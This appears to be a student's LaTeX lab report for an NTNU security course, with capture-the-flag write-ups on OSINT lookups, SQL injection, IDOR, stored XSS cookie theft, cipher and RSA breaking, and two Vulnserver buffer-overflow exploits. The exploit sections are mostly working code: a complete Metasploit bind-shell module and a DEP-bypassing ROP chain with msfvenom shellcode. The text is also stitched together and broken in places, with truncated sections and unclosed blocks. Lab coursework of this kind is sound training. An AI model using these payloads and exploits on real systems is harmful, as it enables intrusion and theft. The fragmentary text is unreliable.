    \item \textbf{Description}
\end{itemize}
\noindent An XLSX spreadsheet was found publicly indexed on the \texttt{ntnu.no} domain. The objective was to identify the name of the person who authored the file, using only open-source (OSINT) search techniques.

    \item \textbf{Search Method}

\begin{quote}
\texttt{site:ntnu.no filetype:xlsx}
\end{quote}

    \item \textbf{Findings}

\subsection{Behind CloudFlare}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent The domain \texttt{statkraft.no} is protected by Cloudflare, which hides the address of the server behind it. The objective was to find the domain's IP history and identify the first name of the person who registered the most recent IP address, using only open-source (OSINT) search techniques.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent Historical DNS databases keep the IP addresses a domain has pointed to over time, independently of Cloudflare. The \emph{IP History} tool on \texttt{viewdns.info} was used to look up \texttt{statkraft.no}, as seen in the figure below:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.85\linewidth]{media/statkraft_ip_history.png}
    \caption{ViewDNS.info IP history for \texttt{statkraft.no}}
    \label{fig:statkraft-ip-history}
\end{figure}

\noindent The lookup returned three historical IP addresses. The most recent one is \texttt{217.114.94.2}, located in Sweden and owned by Optimizely AB, last seen on 2026-10-12.

\noindent To find out who registered this address, it was looked up in the RIPE database, which holds the registration records for European IP ranges. The lookup was done from the command line through the RIPE REST API:

\begin{verbatim}
curl -s "https://rest.db.ripe.net/search.txt\
?query-string=217.114.94.2&flags=no-filtering"
\end{verbatim}

\noindent \textbf{Use of AI:} I got help from an AI assistant (Claude) to create this \texttt{curl} command.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent The relevant part of the RIPE response is shown below:

\begin{verbatim}
inetnum:        217.114.88.1 - 217.114.95.255
netname:        SE-EPISERVER-STOCKHOLM
descr:          EPiServer Hosting SE
country:        SE
admin-c:        TA6484-RIPE
tech-c:         TA6484-RIPE

person:         Tony Andren
address:        Episerver AB
address:        SE-111 56 Stockholm
nic-hdl:        TA6484-RIPE
\end{verbatim}

\noindent The address belongs to the range \texttt{217.114.88.1} to \texttt{217.114.95.255}, registered under the network name \texttt{SE-EPISERVER-STOCKHOLM}. Episerver is the former name of Optimizely, which matches the owner shown by ViewDNS. Both the administrative and technical contact of the range point to the handle \texttt{TA6484-RIPE}, which belongs to \textbf{Tony Andren} at Episerver AB.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}
\end{itemize}

\subsection{Finding routes}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent The objective was to find the route that traffic takes from the IP address \texttt{154.192.15.243} in Islamabad to \texttt{ntnu.no}, and to report the full domain name of the second last hop on that route.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent A traceroute run from my own machine only shows the route from Norway, so a vantage point inside the network in Islamabad was needed. RIPE Atlas is a public measurement platform with probes placed in networks all over the world, and its measurements, including traceroutes, are openly available.

\noindent The IP address \texttt{154.192.15.243} belongs to the Pakistani provider Nayatel (AS23674), and RIPE Atlas has a probe in this network in Islamabad (probe 60223). The domain \texttt{ntnu.no} resolves to \texttt{129.241.160.102}, so the RIPE Atlas API was searched for existing traceroutes towards that address:

\begin{verbatim}
curl -s "https://atlas.ripe.net/api/v2/measurements/\
?target_ip=129.241.160.102&type=traceroute"

\subsection{Encoded Secret}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This was the second web challenge on the same server (\texttt{/challenge/2}). A value had been transformed or rotated before being stored, and the objective was to recover the original flag. The flag format was \texttt{IIK3100\{...\}}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent The page displayed a ``Service Configuration Export'' containing several tokens that were clearly encoded rather than plain text. One of them, \texttt{svc\_token}, was visually highlighted in the page, while the others were styled as ordinary strings:

\begin{verbatim}
build_token  = YnVpbGRfdG9rZW46djItc3RhZ2luZy0yMDI1
legacy_token = L29lpSkuMT1cowcxnKAuLzkyMN==
svc_token    = FHyYZmRjZUgPAUZmAwEsZKAsGwO0K0IhL3W5pUEcZT59   <-- highlighted
checksum     = Y2hlY2tzdW06OWYzYTJiMWM0ZDVlNmY3MA==
\end{verbatim}

\noindent The other tokens decode straight from base64 into harmless decoy values (for example \texttt{build\_token} is base64 for \texttt{build\_token:v2-staging-2025}). The highlighted \texttt{svc\_token}, however, is not valid readable text when base64-decoded directly, which means it was transformed twice. The challenge hint names both steps: ``transformed \emph{or rotated}''. ``Rotated'' is the classic ROT13 cipher (rotate each letter by 13), and ``transformed/encoded for storage'' is base64. Applying the inverse of each, in order ROT13 first and then base64-decode, recovers the flag:

\begin{verbatim}
svc_token  = FHyYZmRjZUgPAUZmAwEsZKAsGwO0K0IhL3W5pUEcZT59
  --ROT13-->  SUlLMzEwMHtCNHMzNjRfMXNfTjB0X0VuY3J5cHRpMG59
  --base64->  IIK3100{B4s364_1s_N0t_Encrypti0n}
\end{verbatim}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent The pairing is certain rather than a lucky guess, for several reasons:

\begin{itemize}[leftmargin=2.2em]
    \item The result is a valid, well-formed flag: printable ASCII, correctly delimited with \texttt{IIK3100\{...\}}, and readable leetspeak English (``Base64 is not encryption''). Every other ordering of the transforms on this token produced binary garbage.
    \item The intermediate step is itself legitimate base64: after ROT13 the string becomes \texttt{SUlLMzEw...}, and \texttt{SUlL} is exactly how \texttt{IIK} base64-encodes. Two independent layers lining up like that rules out coincidence.
    \item The flag's own text states the lesson of the challenge --- base64 is an encoding, not encryption --- which matches the challenge name and description.
    \item \texttt{svc\_token} was the one token visually highlighted in the page source, pointing to it as the target among the decoys.
\end{itemize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}
\end{itemize}
\begin{quote}
\textbf{IIK3100\{B4s364\_1s\_N0t\_Encrypti0n\}}
\end{quote}

\subsection{Authentication Bypass}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This was the fourth web challenge on the same server (\texttt{/challenge/4}). Access was gated by a login form backed by a relational database, and the query logic could be manipulated. The schema had an \texttt{accounts} table and a \texttt{privileges} table with an \texttt{access\_tier} column; the known accounts \texttt{charlie} and \texttt{diana} were \texttt{guest}, and one hidden account had tier \texttt{root}. The objective was to log in as that \texttt{root} account.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent The portal helpfully echoed back the SQL query it executed, which showed that the username and password are inserted directly into the query string without sanitisation:

\begin{verbatim}
SELECT a.id, a.username, p.access_tier
FROM accounts a
LEFT JOIN privileges p ON p.account_id = a.id
WHERE a.username='<input>' AND a.password='<input>'
\end{verbatim}

\noindent Because the input is concatenated straight into the query, it is vulnerable to SQL injection. Rather than guessing the root account's name or password, the \texttt{WHERE} clause itself can be rewritten to select the row by its privilege tier. The following value was entered into the \textbf{username} field:

\begin{verbatim}
' OR p.access_tier='root'-- -
\end{verbatim}

\noindent The leading quote closes the \texttt{username} string, \texttt{OR p.access\_tier='root'} makes the condition match whichever account has the \texttt{root} tier, and \texttt{-- -} comments out the rest of the query (including the password check). The password field can be anything.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent With that input, the executed query became:

\begin{verbatim}
... WHERE a.username='' OR p.access_tier='root'-- -' AND a.password='x'
\end{verbatim}

\noindent This returned the hidden root account (\texttt{id 1}, username \texttt{admin}, \texttt{access\_tier root}), and the portal granted ROOT ACCESS and revealed the flag, as seen in the figure below:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.75\linewidth]{media/auth_bypass_result.png}
    \caption{The injection returns the root account and the portal reveals the flag}
    \label{fig:auth-bypass-result}
\end{figure}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}
\end{itemize}
\begin{quote}
\textbf{IIK3100\{SQL\_1nj3ct10n\_Byp4ss\_L0g1c\}}
\end{quote}

\subsection{Object Traversal (IDOR)}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This was a web challenge served from a dedicated container (\url{http://challenges.iik3100-h26.iaas.iik.ntnu.no:10001/}). The objective was to read the \texttt{secret} field from the admin's profile by exploiting an \textbf{Insecure Direct Object Reference (IDOR)} in the endpoint \texttt{/ch2/api/profile/<id>}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent The profile endpoint returns a user's profile by its numeric \texttt{id}. The flaw is that it only checks that \emph{a} user is logged in --- it never checks that the requested profile \emph{belongs to} that user. So any authenticated account can read any other account's profile just by changing the \texttt{id} in the URL.

\noindent The steps were:
\begin{itemize}[leftmargin=2.2em]
    \item Register an ordinary account on the site and log in (this provides the session cookie the endpoint requires). Without a session, requests to \texttt{/ch2/api/profile/<id>} are redirected to \texttt{/login} (HTTP 302).
    \item While logged in as that low-privilege account, request the profiles by id: \texttt{/ch2/api/profile/0}, \texttt{/1}, \texttt{/2}, \ldots
\end{itemize}

\noindent Enumerating the ids showed that id 0 returns \texttt{not found}, while id 1 is the administrator. The administrator's profile (\texttt{role 1}) includes a \texttt{secret} field containing the flag, even though the request was made from an unrelated account:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.85\linewidth]{media/idor_admin_profile.png}
    \caption{Admin profile (\texttt{id 1}) read through the IDOR, exposing the \texttt{secret} field}
    \label{fig:idor-admin}
\end{figure}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent The endpoint leaks other users' \texttt{secret} fields (the newly registered account's own profile had no such field, but admin, alice, bob and charlie all did). Requesting \texttt{id 1} returned the admin profile with \texttt{username} \texttt{admin} and the flag in its \texttt{secret}.

\subsection{Script Injection (Stored XSS)}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This web challenge featured a message board at \texttt{/ch3} where a \emph{moderator bot} automatically reads every new post while holding a privileged cookie. The objective was to post a message containing a \textbf{stored Cross-Site Scripting (XSS)} payload that exfiltrates the bot's cookie to \texttt{/ch3/collect}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Search Method}
\end{itemize}
\noindent The board stores each post as \textbf{raw HTML} and renders it back to every viewer without sanitisation, which is a stored XSS vulnerability: any script in a post runs in the browser of whoever views the board --- including the moderator bot. The plan was to post a payload that reads the bot's \texttt{document.cookie} and sends it to the collection endpoint \texttt{/ch3/collect?data=<cookie>}.

\noindent The payload used was an image tag with an \texttt{onerror} handler (reliable even when the markup is inserted via \texttt{innerHTML}, where a bare \texttt{<script>} tag would not execute):

\begin{footnotesize}
\begin{verbatim}
<img src=x onerror="new Image().src=
   '/ch3/collect?data='+encodeURIComponent(document.cookie)">
\end{verbatim}
\end{footnotesize}

\noindent When the deliberately broken image (\texttt{src=x}) fails to load, the \texttt{onerror} handler fires, builds a request to \texttt{/ch3/collect} with the viewer's cookie appended, and sends it by setting a new image's \texttt{src}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent After posting the payload, the moderator bot read the board, its browser executed the \texttt{onerror} handler, and its privileged cookie was sent to \texttt{/ch3/collect}. Once the server received the bot's cookie, it revealed the flag in a green box on the board page, as seen in the figure below:

    \caption{The stored XSS payload on the board and the flag revealed after the bot's cookie was collected}
    \label{fig:xss-board}
\end{figure}

\begin{itemize}[leftmargin=1.5em]

\subsection{Caesar's Column}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This was a classical-cryptography challenge. A message was protected with \textbf{two} classical ciphers applied in order: first a \textbf{columnar transposition} (6-letter keyword of distinct letters, unknown), then a \textbf{Caesar cipher} (shift 1--25, unknown). The encryption source and the ciphertext were given; the task was to recover the plaintext. The flag format was \texttt{NTNU\{...\}}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Analysis}
\end{itemize}
\noindent The two layers are reversed in the opposite order to how they were applied: first undo the Caesar shift, then undo the transposition.
\begin{itemize}[leftmargin=2.2em]
    \item \textbf{Caesar} has only 25 possible shifts, so all of them can be tried. The Caesar step shifts only \texttt{A--Z}; spaces and punctuation pass through unchanged.
    \item The \textbf{columnar transposition} reads the grid's columns in the alphabetical order of the keyword's letters. A 6-letter keyword gives $6! = 720$ possible column orders. Rather than guessing the keyword, one can brute-force all 720 \emph{column orders} directly.
\end{itemize}
\noindent That is only $26 \times 720 = 18\,720$ combinations in total --- trivially brute-forceable. The ciphertext is 102 characters, i.e.\ 17 rows $\times$ 6 columns.

\noindent The one subtlety (noted in the challenge hints): simply searching for \texttt{NTNU\{} is not enough, because swapping two columns that do not touch the flag leaves the flag readable while garbling the rest. So every candidate is \textbf{scored} by counting common English words (\texttt{THE}, \texttt{IS}, \texttt{AFTER}, \ldots), and the highest-scoring decryption is kept.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Solution Code}
\end{itemize}
\noindent The core is a \texttt{columnar\_decrypt()} that inverts the transposition for a given column order, plus a brute-force search over all shifts and orders:

\begin{footnotesize}
\begin{verbatim}
def columnar_decrypt(ciphertext, order):
    cols = len(order)
    rows = len(ciphertext) // cols
    chunks = [ciphertext[i*rows:(i+1)*rows] for i in range(cols)]
    grid_cols = [None] * cols
    for k, c in enumerate(order):     # chunk k came from original column order[k]
        grid_cols[c] = chunks[k]
    return "".join(grid_cols[c][r] for r in range(rows) for c in range(cols))

def solve(ciphertext):
    best = None
    for shift in range(26):
        unshifted = caesar(ciphertext, -shift)          # 1) undo Caesar
        for order in permutations(range(6)):            # 2) try all 720 orders
            plaintext = columnar_decrypt(unshifted, order)
            score = english_score(plaintext)            # score for English
            if best is None or score > best[0]:
                best = (score, shift, order, plaintext)
    return best
\end{verbatim}
\end{footnotesize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent The best-scoring candidate was found with \textbf{Caesar shift 17} and \textbf{column order (0, 4, 3, 1, 2, 5)}, giving the plaintext:

\begin{footnotesize}
\begin{verbatim}
CONGRATULATIONS AGENT. THE SECRET IS NTNU{FREQUENCY_ANALYSIS_NEVER_SLEEPS}.
DESTROY AFTER READING.XXXX
\end{verbatim}
\end{footnotesize}

\noindent (The trailing \texttt{XXXX} is the \texttt{X} padding added by the transposition.)

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}
\end{itemize}
\begin{quote}
\textbf{NTNU\{FREQUENCY\_ANALYSIS\_NEVER\_SLEEPS\}}
\end{quote}

\begin{itemize}[leftmargin=1.5em]

\end{itemize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Analysis}
\end{itemize}
\noindent The four targets used fast, general-purpose hash functions with no key-stretching, which makes them cheap to brute-force:
\begin{itemize}[leftmargin=2.2em]

    \item Target 2: \texttt{sha1}, unsalted
    \item Target 3: \texttt{sha256}, unsalted

\noindent A small wordlist of common passwords was provided. Real users rarely pick a raw dictionary word; they apply predictable \textbf{mutation rules}, so each wordlist entry was expanded into candidates using: case changes (lower / UPPER / Capitalised), \textbf{leetspeak} substitutions (\texttt{a$\rightarrow$@}, \texttt{o$\rightarrow$0}, \texttt{e$\rightarrow$3}, \ldots), and appended digits / years. \subsection{Tiny Primes, Big Problems}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This challenge targeted an RSA implementation whose developer used primes that were far too small. The flag was encrypted with textbook RSA (no padding): the flag was split into 6-byte chunks (the last chunk NUL-padded to 6 bytes), and each chunk $m$ (as a big-endian integer) was encrypted as $c = m^e \bmod n$. The task was to recover the flag (\texttt{NTNU\{...\}}).

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Analysis}
\end{itemize}
\noindent RSA's security rests on the difficulty of factoring the modulus $n$ into its two prime factors $p$ and $q$. Here $n = 889970796180013$ is only about 50 bits, so it factors essentially instantly --- the two primes turned out to be 25-bit numbers. Once $n$ is factored, the private key follows directly from the public parameters:
\begin{itemize}[leftmargin=2.2em]
    \item factor $n = p \times q$ (Pollard's rho; trial division would also work for such a small $n$),
    \item compute $\varphi(n) = (p-1)(q-1)$,
    \item compute the private exponent $d = e^{-1} \bmod \varphi(n)$ (\texttt{pow(e, -1, phi)}),
    \item decrypt each block with $m = c^d \bmod n$ and convert back to 6 bytes.
\end{itemize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Solution Code}
\end{itemize}
\begin{footnotesize}
\begin{verbatim}
p = pollard_rho(n); q = n // p          # factor the tiny modulus
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)                      # private exponent
flag = b""
for c in ciphertext:
    m = pow(c, d, n)                     # textbook RSA decryption
    flag += m.to_bytes(6, "big")
flag = flag.rstrip(b"\x00")              # drop the NUL padding
\end{verbatim}
\end{footnotesize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent $n$ factored into $p = 29594171$ and $q = 30072503$, which gave the private exponent and decrypted all five blocks to the flag.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}
\end{itemize}
\begin{quote}
\textbf{NTNU\{SMALL\_PRIMES\_FALL\_FAST\}}
\end{quote}

\subsection{Clockwork Key}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This challenge involved a secret encrypted with AES-128-CBC. To ``generate a random key'' the developer seeded Python's \texttt{random} module with the current Unix timestamp. A leaked server log narrowed the encryption time to some point on 2025-10-24 (UTC). The blob was \texttt{base64(IV (16 bytes) || ciphertext)}, PKCS\#7 padded. The task was to recover the flag (\texttt{NTNU\{...\}}).

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Analysis}
\end{itemize}
\noindent The weakness is not AES itself but the \textbf{key generation}. A secure key needs 128 bits of entropy (about $3.4\times10^{38}$ possibilities). Here the key is fully determined by the seed, and the seed is a Unix timestamp within a single known day. A day is only $86\,400$ seconds, so there are at most $86\,400$ possible keys --- the entire keyspace can be brute-forced in moments. For each candidate seed in the window, the key is regenerated the same way the developer made it, the blob is decrypted, and success is recognised when the PKCS\#7 padding is valid and the plaintext starts with \texttt{NTNU\{}.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Solution Code}
\end{itemize}
\begin{footnotesize}
\begin{verbatim}
for seed in range(WINDOW_START, WINDOW_END):   # every second of the day
    key = generate_key(seed)                    # same vulnerable generator
    try:
        plaintext = decrypt(BLOB, key)          # AES-CBC + unpad
    except ValueError:
        continue                                # wrong key -> bad padding
    if plaintext.startswith(b"NTNU{"):
        print("seed =", seed, "flag:", plaintext.decode())
        break
\end{verbatim}
\end{footnotesize}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Findings}
\end{itemize}
\noindent The correct seed was \texttt{1761346412} (a timestamp on 2025-10-24), which regenerated the key and decrypted the flag.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Flag}

\subsection{Exploit Developer 1}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This task required developing and implementing a functional Metasploit module that exploits a vulnerable Windows application (\emph{Vulnserver}) and establishes a \textbf{bind shell} on the victim machine. The work covered setting up the lab, analysing the application, identifying the vulnerability, developing the Metasploit module, and obtaining the shell.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Laboratory Setup}
\end{itemize}
\noindent The lab consisted of two virtual machines on the same virtual network so the attacker could reach the victim:
\begin{itemize}[leftmargin=2.2em]
    \item \textbf{Victim / development machine:} Windows 11, running \texttt{vulnserver.exe} (with \texttt{essfunc.dll} in the same folder) listening on TCP port 9999, and the \textbf{Immunity Debugger} with the \textbf{mona.py} plugin for analysis. Windows Defender and the Windows Firewall were disabled so the shellcode would not be quarantined and the ports would be reachable.
    \item \textbf{Attacker machine:} Kali Linux, with Metasploit.
\end{itemize}
\noindent The victim was assigned \texttt{192.168.122.158} and Kali \texttt{192.168.122.157}. Reachability was verified with \texttt{nmap -p 9999 192.168.122.158} (port open).

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Vulnerability Analysis}
\end{itemize}
\noindent Connecting to the service (\texttt{HELP}) listed its commands. The \texttt{TRUN} command is vulnerable to a classic \textbf{stack-based buffer overflow}: a long argument overflows a fixed-size stack buffer and overwrites the saved return address (EIP), allowing control of execution flow.

\noindent \textbf{Finding the EIP offset.} A 3000-byte cyclic (De Bruijn) pattern was sent as the \texttt{TRUN} argument, crashing the service. In Immunity, \texttt{!mona findmsp} located the pattern in memory and reported that EIP is overwritten at \textbf{offset 2004}, with ESP pointing into the attacker-controlled buffer shortly after:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.9\linewidth]{media/exd1_findmsp.png}
    \caption{\texttt{!mona findmsp} reporting EIP control at offset 2004 and ESP in the buffer}
    \label{fig:exd1-findmsp}
\end{figure}

\noindent The offset was confirmed by sending \texttt{A}$\times$2004 + \texttt{BBBB} + \texttt{C}$\times$992. EIP became exactly \texttt{42424242} (the four B's) and ESP pointed to a block of \texttt{43 43 43 43} (the C's), proving precise control of EIP and that shellcode placed after the return address lands at ESP:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.75\linewidth]{media/exd1_eip_control.png}
    \caption{EIP overwritten with \texttt{42424242}; EBP = \texttt{41414141}, ESP points at the C's}
    \label{fig:exd1-eip}
\end{figure}

\noindent \textbf{Bad characters.} A reference byte array of \texttt{\textbackslash x01}--\texttt{\textbackslash xff} (excluding the null byte) was generated with \texttt{!mona bytearray -b "\textbackslash x00"} and sent at ESP. Comparing the memory against the reference with \texttt{!mona compare} returned ``unmodified'', so the \textbf{only bad character is \texttt{\textbackslash x00}}:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.85\linewidth]{media/exd1_badchars.png}
    \caption{\texttt{!mona compare} result: no bad characters besides \texttt{\textbackslash x00}}

\end{figure}

\noindent \textbf{Finding a redirection gadget.} To reliably jump into the shellcode at ESP, a \texttt{JMP ESP} instruction was located with \texttt{!mona jmp -r esp -m essfunc.dll}. The module \texttt{essfunc.dll} was chosen because it has \textbf{no ASLR, no rebase and no SafeSEH}, so its addresses are stable on every run. The address \textbf{\texttt{0x625012F0}} was selected (its bytes contain no \texttt{\textbackslash x00}):

\begin{figure}[H]

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Exploit Development (Metasploit module)}
\end{itemize}
\noindent The analysis gives the exploit structure: \texttt{2004} filler bytes, the \texttt{JMP ESP} address (\texttt{0x625012F0}) over EIP, a short NOP sled, then the bind-shell shellcode. This was implemented as a Metasploit module, placed in \texttt{\textasciitilde/.msf4/modules/exploits/windows/misc/vulnserver\_trun.rb} on Kali:

\begin{footnotesize}
\begin{verbatim}
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'       => 'Vulnserver TRUN Buffer Overflow (Bind Shell)',
      'Platform'   => 'win',
      'Arch'       => ARCH_X86,
      'Payload'    => { 'Space' => 500, 'BadChars' => "\x00",
                        'DisableNops' => true },
      'Targets'    => [
        [ 'Windows 11 - Vulnserver / essfunc.dll',
          { 'Ret' => 0x625012f0, 'Offset' => 2004 } ]
      ],
      'DefaultTarget' => 0))
    register_options([ Opt::RPORT(9999) ])
  end

  def exploit
    connect
    banner = sock.get_once
    print_status("Banner: #{banner.to_s.strip}") if banner

    buffer  = "TRUN /.:/"                        # vulnerable command
    buffer << rand_text_alpha(target['Offset'])  # 2004 bytes to EIP
    buffer << [target.ret].pack('V')             # EIP -> JMP ESP
    buffer << make_nops(16)                       # NOP sled
    buffer << payload.encoded                      # bind shell
    buffer << "\r\n"

    print_status("Sending overflow (offset=#{target['Offset']}, " \
                 "ret=0x#{target.ret.to_s(16)})")
    sock.put(buffer)
    handler        # connect to the bind payload on the victim
    disconnect
  end
end
\end{verbatim}
\end{footnotesize}

\subsection{Exploit Developer 2}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Description}
\end{itemize}
\noindent This task required porting the Exploit Developer 1 exploit so that it works against a Windows environment with \textbf{Data Execution Prevention (DEP)} enabled. A functional Python exploit was acceptable (no Metasploit module required), and either a bind or reverse shell was the goal. The lab was the same as EXD1 (Windows~11 victim with Vulnserver, Immunity + mona; Kali attacker), with DEP turned on via \texttt{bcdedit /set \{current\} nx AlwaysOn} followed by a reboot. DEP being active was confirmed with \texttt{bcdedit | findstr nx}:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.5\linewidth]{media/exd2_dep_enabled.png}
    \caption{DEP enabled on the victim (\texttt{nx AlwaysOn})}
    \label{fig:exd2-dep-enabled}
\end{figure}

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{Why the EXD1 exploit fails under DEP}
\end{itemize}
\noindent The EXD1 exploit overwrites EIP with a \texttt{JMP ESP} and executes shellcode placed on the stack. DEP marks the stack as \textbf{non-executable}, so although the overflow and the \texttt{JMP ESP} redirect still succeed (EIP reaches the stack), the CPU faults the instant it tries to execute the stack bytes. Re-running the EXD1 payload with DEP on produced an access violation \emph{executing a stack address}, with EIP sitting in the stack (\texttt{00FAF9FC}) and EBP still holding the filler \texttt{41414141}:

\begin{figure}[H]
    \centering
    \includegraphics[width=0.6\linewidth]{media/exd2_dep_fail.png}
    \caption{DEP blocks execution: EIP reached the stack (\texttt{00FAF9FC}) but faulted on execute}
    \label{fig:exd2-depfail}
\end{figure}

\noindent The same bytes ran fine in EXD1 (DEP off) and produced a shell; only DEP prevents it. This is the limitation the exploit must overcome.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{The bypass: ROP to \texttt{VirtualProtect}}
\end{itemize}
\noindent DEP can be defeated with \textbf{Return-Oriented Programming (ROP)}: instead of executing shellcode directly, the saved return address is pointed at a chain of existing code fragments (``gadgets'') that call the Windows API \texttt{VirtualProtect()} to change the stack's memory protection to \texttt{PAGE\_EXECUTE\_\allowbreak READWRITE} (\texttt{0x40}). Once the stack is executable, the chain returns into the shellcode, which now runs normally.

\noindent The ROP chain was generated with mona:

\begin{footnotesize}
\begin{verbatim}
!mona rop -m *.dll -cp nonull
\end{verbatim}
\end{footnotesize}

\begin{figure}[H]
    \centering
    \includegraphics[width=0.75\linewidth]{media/exd2_mona_rop.png}
    \caption{mona generating the ROP chain and writing \texttt{rop\_chains.txt}}
    \label{fig:exd2-monarop}
\end{figure}

\noindent mona produced a ready \texttt{VirtualProtect} chain in \texttt{rop\_chains.txt}. It resolves \texttt{VirtualProtect} through the IAT of the non-ASLR \texttt{essfunc.dll} (\texttt{0x625070d0}) and sets up the arguments via a \texttt{PUSHAD} gadget:

\begin{footnotesize}
\begin{verbatim}
0x76e9d78a,  # POP EDI # RETN            [ucrtbase.dll]
0x625070d0,  # ptr to &VirtualProtect()  [IAT essfunc.dll]
0x76e20191,  # MOV ESI,DWORD PTR DS:[EDI] ...  [ucrtbase.dll]
0x41414141,  # filler (x4)
0x7724474b,  # POP EBP # RETN            [msvcrt.dll]
0x625012fd,  # & jmp esp                 [essfunc.dll]   (return -> shellcode)
0x77278e38,  # POP EDX # RETN            [msvcrt.dll]
0xfffffdff,  # -> 0x00000201 (dwSize)   via NEG
0x76edfcb0,  # NEG EDX # RETN            [ucrtbase.dll]
0x77354939,  # MOV EBX,EDX # RETN        [ntdll.dll]
0x772856f8,  # POP EDX # RETN            [msvcrt.dll]
0xffffffc0,  # -> 0x00000040 (PAGE_EXECUTE_READWRITE) via NEG
0x76edfcb0,  # NEG EDX # RETN            [ucrtbase.dll]
0x7722a505,  # POP ECX # RETN            [msvcrt.dll]
0x62505be2,  # &Writable location        [essfunc.dll]
0x751a5c6b,  # POP EDI # RETN            [RPCRT4.dll]
0x7642a0a4,  # RETN (ROP NOP)            [KERNELBASE.dll]
0x7640c19b,  # POP EAX # RETN            [KERNELBASE.dll]
0x90909090,  # nop
0x7646c2e3,  # PUSHAD # RETN             [KERNELBASE.dll]
\end{verbatim}
\end{footnotesize}

\noindent \textbf{Note on ASLR.} Most gadgets come from ASLR'd system DLLs (\texttt{ucrtbase}, \texttt{msvcrt}, \texttt{ntdll}, \texttt{RPCRT4}, \texttt{KERNELBASE}); only \texttt{essfunc.dll} is fixed. Their addresses are randomised per boot, so the chain is valid for the \emph{current boot session} (it survives Vulnserver restarts within a session, but must be regenerated after a reboot). This task concerns DEP, not ASLR; defeating ASLR as well would require an information leak.

\begin{itemize}[leftmargin=1.5em]
    \item \textbf{The modified exploit}
\end{itemize}
\noindent The EXD1 single \texttt{JMP ESP} was replaced by the ROP chain. The structure keeps the same offset (2004); the chain overwrites EIP and runs, then execution falls through a NOP sled into the shellcode on the now-executable stack:

\begin{footnotesize}
\begin{verbatim}
buf  = b"TRUN /.:/"
buf += b"A" * 2004          # padding to the saved return address (EIP)
buf += create_rop_chain()    # EIP -> ROP chain -> VirtualProtect() marks stack RWX
buf += b"\x90" * 16          # NOP sled
buf += shellcode             # windows/shell_bind_tcp (LPORT 4444), now executable
\end{verbatim}
\end{footnotesize}

\noindent The shellcode was generated with:
\begin{footnotesize}
\begin{verbatim}
msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b '\x00' -f python
\end{verbatim}
\end{footnotesize}
